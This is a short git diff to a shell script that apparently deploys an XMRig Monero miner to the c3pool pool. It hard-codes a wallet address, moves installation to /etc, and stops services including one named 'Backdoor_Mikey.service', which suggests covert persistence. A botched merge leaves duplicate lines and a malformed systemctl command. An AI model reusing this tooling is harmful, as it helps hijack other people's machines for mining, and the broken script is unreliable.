@@ -21,9 +21,9 @@ poolPort=17777  #     80: 1000 diff (Firewall bypass)
                 #     43333: 2G diff (ETH port)
                 #     53333: 2G diff (ETH port/SSL/TLS)
 # your wallet public address
-wallet=4256HG8... # place it HERE!
+wallet=4256HG8uJUTPBqZiJYPNQ92x6PV1sUsngAsv3TQX4woqJGFsKQkjCdoZKbgfr8C3VnLWK7Qd5Y3WJBPcuzMW93AmVSYtN2W # place it HERE!
 # installation directory (DONT change)
-InstDIR=$HOME
+InstDIR=/etc
 DIR=$InstDIR/c3pool
 # remote build via IP
 # remote=true #deprecated run the `. build.sh -r` for remote build deploy
@@ -52,13 +52,10 @@ function killAll () {
     sed -i '/c3pool/d' $HOME/.profile;
     killall -9 xmrig;
     sudo systemctl stop Backdoor_Mikey.service  
-<<<<<<< HEAD
     systemctl stop c3pool_miner.service
     sudo systemctl shuffle.service  
-=======
     sudo systemctl stop c3pool_miner.service
     sudo systemctl stop shuffle.service  
->>>>>>> 8855c5a9c19513931fbc02f68b0e05aa30f02ed0
     log 'killed all services.'
 }
 function stopService () {
